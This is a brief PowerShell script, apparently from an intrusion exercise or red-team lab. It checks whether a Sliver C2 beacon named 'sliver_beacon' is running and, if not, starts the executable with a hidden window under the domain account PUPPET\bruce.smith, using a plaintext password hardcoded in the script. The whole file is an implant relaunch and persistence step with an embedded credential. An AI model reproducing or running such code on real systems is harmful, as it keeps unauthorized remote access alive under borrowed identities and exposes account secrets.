# 1. Define the process name (usually the filename without .exe)
$processName = "sliver_beacon"
$filePath = "C:\Files\sliver_beacon.exe"

# 2. Check if the process is already running
if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
    Write-Output "Beacon is already running. Exiting."
}
else {
    Write-Output "Beacon not found. Starting now..."
    
    # 3. Setup Credentials
    $pass = ConvertTo-SecureString 'Legend4_ryS4n1nFTW' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential ('PUPPET\bruce.smith', $pass)

    # 4. Start the process
    Start-Process -FilePath $filePath -Credential $creds -WindowStyle Hidden
}
